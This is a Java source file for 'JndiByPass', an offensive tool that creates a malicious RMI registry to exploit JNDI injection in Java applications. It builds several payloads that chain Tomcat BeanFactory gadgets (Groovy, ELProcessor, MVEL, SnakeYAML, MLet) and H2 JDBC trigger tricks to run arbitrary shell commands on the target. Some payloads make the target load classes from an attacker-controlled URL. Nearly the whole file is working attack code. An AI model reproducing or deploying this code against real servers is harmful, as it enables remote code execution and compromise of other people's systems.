import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.*;

public class JndiByPass {
    private static final String[] win_cmd = new String[]{"cmd.exe", "/c"};

    private static final String[] linux_cmd = new String[]{"bash", "-c"};

    public static void main(String[] args) throws Exception {
        System.out.println("ByPassJndi Tools(Power by Starlight Laboratory)");
        Reference ref;
        try {
            if (args[0].equals("-h") || args[0].equals("--help")) {
                printUsage();
            } else {
                String ip = args[0];
                int port = Integer.parseInt(args[1]);
                String model = args[2];
                String[] system;
                if (args[3].contains("win")) {
                    system = win_cmd;
                } else {
                    system = linux_cmd;
                }
                String cmd = args[4];
                System.setProperty("java.rmi.server.hostname", ip);
                System.out.println("Creating evil RMI registry on " + ip + " port " + args[1] + "");
                Registry registry = LocateRegistry.createRegistry(port);

                switch (model) {
                    case "groovy":
                        ref = groovy(cmd, system);
                        break;
                    case "elProcessor":
                        ref = elProcessor(cmd, system);
                        break;
                    case "tomcatMLet":
                        ref = tomcatMLet(cmd, args[4]);
                        break;
                    case "tomcatSnakeyaml":
                        ref = tomcatSnakeyaml(cmd, args[4]);
                        break;
                    case "tomcatMVEL":
                        ref = tomcatMVEL(cmd, system);
                        break;
                    case "dbcpByFactory":
                        ref = dbcpByFactory(args[5], cmd, system);
                        break;
                    case "druid":
                        ref = druid(cmd, system);
                        break;
                    default:
                        System.out.println("please input -h/--help");
                        throw new IllegalStateException("Unexpected value: " + model);
                }
                ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
                registry.bind("Object", referenceWrapper);
                System.out.println("Payload: rmi://" + ip + ":" + port + "/Object");
            }
        } catch (ArrayIndexOutOfBoundsException e) {
            System.out.println("please input -h/--help");
        }
    }

    private static ResourceRef groovy(String cmd, String[] system) throws Exception {
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", "new java.lang.ProcessBuilder(\"" + system[0] + "\",\"" + system[1] + "\",\"" + cmd + "\").start()"));
        System.out.println("payload:" + "new java.lang.ProcessBuilder(\"" + system[0] + "\",\"" + system[1] + "\",\"" + cmd + "\").start()");
        return ref;
    }

    private static ResourceRef elProcessor(String cmd, String[] system) {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder(\\" + "\"" + system[0] + "\\" + "\",\\" + "\"" + system[1] + "\\" + "\",\\" + "\"" + cmd + "\\" + "\").start()\")"));
        System.out.println("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder(\\" + "\"" + system[0] + "\\" + "\",\\" + "\"" + system[1] + "\\" + "\",\\" + "\"" + cmd + "\\" + "\").start()\")");
        return ref;
    }

    private static ResourceRef tomcatMLet(String ip, String classpath) {
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "" + classpath + ""));
        ref.add(new StringRefAddr("b", "http://" + ip + "/" + classpath + ""));
        ref.add(new StringRefAddr("c", "Blue"));
        return ref;
    }

    private static ResourceRef tomcatSnakeyaml(String ip, String classpath) {
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://" + ip + "/" + classpath + "\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        System.out.println(yaml);
        return ref;
    }

    private static ResourceRef tomcatMVEL(String cmd, String[] system) {
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a",
                "Runtime.getRuntime().exec(new String[]{\"" + system[0] + "\",\"" + system[1] + "\",\"" + cmd + "\"});"));
        System.out.println("Runtime.getRuntime().exec(new String[]{\"" + system[0] + "\",\"" + system[1] + "\",\"" + cmd + "\"});");
        return ref;
    }

    private static Reference dbcpByFactory(String factory, String cmd, String[] system) {
        Reference ref = new Reference("javax.sql.DataSource", factory, null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "new java.lang.ProcessBuilder(\"" + system[0] + "\",\"" + system[1] + "\",\"" + cmd + "\").start()\n" +
                "$$\n";
        System.out.println("jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "new java.lang.ProcessBuilder(\"" + system[0] + "\",\"" + system[1] + "\",\"" + cmd + "\").start()\n" +
                "$$\n");
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("url", JDBC_URL));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));
        return ref;
    }

    private static Reference druid(String cmd, String[] system){
        Reference ref = new Reference("javax.sql.DataSource","com.alibaba.druid.pool.DruidDataSourceFactory",null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "new java.lang.ProcessBuilder(\"" + system[0] + "\",\"" + system[1] + "\",\"" + cmd + "\").start()\n" +
                "$$\n";
        String JDBC_USER = "root";
        String JDBC_PASSWORD = "password";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username",JDBC_USER));
        ref.add(new StringRefAddr("password",JDBC_PASSWORD));
        ref.add(new StringRefAddr("initialSize","1"));
        ref.add(new StringRefAddr("init","true"));
        return ref;
    }

    private static void printUsage() {
        System.err.println("Usage: java -jar BypassJndi.jar [ip] [port] [model] [system] '[cmd]'|vps classpath ");
        System.err.println("  Available model types:");

        final List<String> payloadClasses = new ArrayList();
        payloadClasses.add("groovy");
        payloadClasses.add("elProcessor");
        payloadClasses.add("druid");
        payloadClasses.add("tomcatMLet");
        payloadClasses.add("tomcatSnakeyaml");
        payloadClasses.add("tomcatMVEL");
        payloadClasses.add("dbcpByFactory");

        final List<String> dependencies = new ArrayList();
        dependencies.add("groovy.lang.GroovyShell");
        dependencies.add("javax.el.ELProcessor");
        dependencies.add("com.alibaba.druid.pool.DruidDataSourceFactory");
        dependencies.add("javax.management.loading.MLet");
        dependencies.add("org.yaml.snakeyaml.Yaml");
        dependencies.add("org.mvel2.sh.ShellSession");
        dependencies.add(Strings.join(new jdbc().getJdbcClass(),", ","",""));

        final List<String> effects = new ArrayList();
        effects.add("RCE");
        effects.add("RCE");
        effects.add("RCE");
        effects.add("Dnslog Search Class");
        effects.add("URLClassLoader RCE");
        effects.add("RCE");
        effects.add("RCE");

        final List<String[]> rows = new LinkedList();
        rows.add(new String[] {"Payload", "Authors", "Effect", "Dependencies"});
        rows.add(new String[] {"-------", "-------", "------", "------------"});
        for (int i = 0; i < payloadClasses.size();i++) {
            rows.add(new String[] {
                    payloadClasses.get(i),
                    Strings.join(Arrays.asList("2rpang"), ", ", "@", " "),
                    Strings.join(Arrays.asList(effects.get(i)),", ","",""),
                    Strings.join(Arrays.asList(dependencies.get(i)),", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }

}
